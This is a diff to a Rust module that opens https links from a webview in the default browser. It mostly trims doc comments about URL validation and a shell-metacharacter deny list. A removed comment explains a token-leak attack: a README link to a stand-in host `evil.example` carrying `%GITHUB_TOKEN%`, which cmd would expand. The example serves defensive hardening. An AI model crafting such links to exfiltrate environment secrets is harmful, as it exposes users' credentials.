@@ -1,24 +1,6 @@
-//! Open an `https://` URL in the user's default browser — how a listed PR
-//! is opened from the rail.
-//!
-//! Deliberately tiny and deliberately strict: this command exists to open the
-//! user's browser at a pull request, **nothing else**. It refuses every non-https
-//! URL (`bad-url`) — no `file://`, no `javascript:`, no custom schemes — and it
-//! also refuses shell metacharacters (see [`validate_https`]): the webview is the
-//! caller, and a command that can start programs must not trust it an inch
-//! further than the feature needs. The Markdown preview opens README links
-//! through it too, so a link can come from any repository the user clones.
-//!
-//! The opener per OS is a **pure function** ([`macos_command`] /
-//! [`linux_command`] / [`windows_opener`]) so it is unit-tested on every host;
-//! the spawn (or, on Windows, `ShellExecuteW`, never `cmd.exe`) is glue. The opener is spawned detached (no wait on the
-//! command path — a tiny reaper thread collects the exit so no zombie lingers).
-//!
-//! Binary resolution: `open` is OS-shipped at `/usr/bin/open` on macOS, so the
-//! absolute path is used. On Linux `xdg-open` is resolved **leniently** (a
-//! deliberate, documented choice): `/usr/bin/xdg-open` when it exists — its home on every
-//! mainstream distro — else the bare name, letting the PATH lookup at spawn
-//! handle exotic layouts; a spawn failure is reported, never silent.
+//! Opens an `https://` URL in the default browser. Links can come from any cloned repo's
+//! README, so the webview is untrusted: non-https and shell metacharacters are refused
+//! ([`validate_https`]). Openers are pure per OS; Windows uses `ShellExecuteW`, never cmd.
 
 use crate::spawn::NoWindow as _;
 
@@ -28,12 +10,8 @@ pub const ERROR_CODES: [&str; 2] = ["bad-url", "unknown"];
 
 const HTTPS_PREFIX: &str = "https://";
 
-/// Characters refused inside a URL, beyond controls and whitespace. `"` would
-/// break out of quoting, and `& | < > ^` and backtick are `cmd.exe`
-/// metacharacters. The Windows opener no longer goes through cmd
-/// ([`windows_opener`]); they stay refused as defence in depth. A GitHub PR URL
-/// (`https://host/owner/repo/pull/123`) never contains any of these, so the
-/// strictness costs the feature nothing.
+/// Refused beyond controls and whitespace: `"` and `cmd.exe` metacharacters, kept as defence
+/// in depth though the Windows opener skips cmd. A GitHub PR URL never contains any of them.
 const REFUSED_CHARS: [char; 7] = ['"', '&', '|', '<', '>', '^', '`'];
 
 /// Accept exactly the URLs this command exists for: `https://` (lowercase — the
@@ -57,10 +35,7 @@ pub fn validate_https(url: &str) -> Result<(), String> {
     Ok(())
 }
 
-// ---------------------------------------------------------------------------
-// The per-OS opener command (pure — every variant compiled and tested on every
-// host; only the `os_opener` glue is cfg'd)
-// ---------------------------------------------------------------------------
+// --- Per-OS opener commands: pure, tested on every host; only `os_opener` is cfg'd ---
 
 /// macOS: `/usr/bin/open <url>` — OS-shipped, absolute.
 pub fn macos_command(url: &str) -> (String, Vec<String>) {
@@ -92,14 +67,8 @@ pub enum Opener {
     ShellExecute(String),
 }
 
-/// Windows: `ShellExecuteW("open", <url>)`, the URL exactly as given.
-///
-/// **Not `cmd /c start "" <url>`.** cmd expands `%NAME%` in its
-/// command line, and `%` is legal in a URL, so a link in a cloned repo's README
-/// (`https://evil.example/?k=%GITHUB_TOKEN%`), clicked in the Markdown preview, reached the
-/// browser with the token in it. `%` cannot be refused (every percent-encoded link has one),
-/// and cmd has no reliable escape for it on a command line. The shell's URL handler is what
-/// `start` ends up calling anyway, minus cmd.
+/// Windows: `ShellExecuteW("open", <url>)`, never `cmd /c start`: cmd expands `%NAME%`, so a
+/// README link like `?k=%GITHUB_TOKEN%` would leak the variable, and `%` cannot be refused.
 pub fn windows_opener(url: &str) -> Opener {
     Opener::ShellExecute(url.to_string())
 }
